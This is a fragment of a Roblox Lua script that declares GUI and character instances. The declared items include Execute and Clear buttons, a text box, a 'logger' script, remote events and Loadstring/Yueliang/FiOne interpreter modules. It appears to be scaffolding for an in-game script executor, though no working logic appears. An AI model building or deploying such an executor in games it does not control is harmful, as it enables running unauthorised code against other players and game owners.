 
local ScreenGui = Instance.new("ScreenGui") 
local Frame = Instance.new("Frame") 
local LocalScript1 = Instance.new("LocalScript") 
local ImageLabel2 = Instance.new("ImageLabel") 
local main = Instance.new("Frame") 
local Drag = Instance.new("LocalScript") 
local TextButton = Instance.new("TextButton") 
local ImageLabel = Instance.new("ImageLabel") 
local Frame3 = Instance.new("Frame") 
local Cle = Instance.new("TextButton") 
local Exe = Instance.new("TextButton") 
local R = Instance.new("TextButton") 
local logger = Instance.new("Script") 
local TextBox = Instance.new("TextBox") 
local LocalScript4 = Instance.new("LocalScript") 
local RemoteEvent5 = Instance.new("RemoteEvent") 
local LocalScript6 = Instance.new("LocalScript") 
local Script7 = Instance.new("Script") 
local Loadstring = Instance.new("ModuleScript") 
local FiOne = Instance.new("ModuleScript") 
local Yueliang = Instance.new("ModuleScript") 
local R8 = Instance.new("ModuleScript") 
local LocalScript9 = Instance.new("LocalScript") 
local DefaultCharacter = Instance.new("Model") 
local Animate = Instance.new("LocalScript") 
local Health = Instance.new("Script") 
local Sound = Instance.new("Script") 
local HumanoidRootPart = Instance.new("Part") 
local Humanoid = Instance.new("Humanoid") 
local RightLeg = Instance.new("Part") 
local LeftLeg = Instance.new("Part") 
local RightArm = Instance.new("Part") 
local LeftArm = Instance.new("Part") 
local Torso = Instance.new("Part") 
local Head = Instance.new("Part") 
local ScaleDampeningPercent = Instance.new("NumberValue") 
local sit = Instance.new("StringValue") 
local fall = Instance.new("StringValue") 
local toolnone = Instance.new("StringValue") 
local climb = Instance.new("StringValue") 
local jump = Instance.new("StringValue") 
local run = Instance.new("StringValue") 
local walk = Instance.new("StringValue") 
local idle = Instance.new("StringValue") 
local SitAnim = Instance.new("Animation") 
local FallAnim = Instance.new("Animation") 
local ToolNoneAnim = Instance.new("Animation") 
local ClimbAnim = Instance.new("Animation") 
local JumpAnim = Instance.new("Animation") 
local RunAnim = Instance.new("Animation") 
local WalkAnim = Instance.new("Animation") 
local Animation = Instance.new("Animation") 
local Animation10 = Instance.new("Animation") 
local Weight11 = Instance.new("NumberValue") 
local Weight = Instance.new("NumberValue") 
local LocalSound = Instance.new("LocalScript") 
local RootJoint = Instance.new("Motor6D") 
local RootAttachment = Instance.new("Attachment") 
local CharacterSoundEvent12 = Instance.new("RemoteEvent") 
local Jump = Instance.new("LocalScript") 
local Respawn = Instance.new("Script") 
local Animator = Instance.new("Animator") 
local RightFootAttachment = Instance.new("Attachment") 
local CharacterSoundEvent13 = Instance.new("RemoteEvent") 
local LeftFootAttachment = Instance.new("Attachment") 
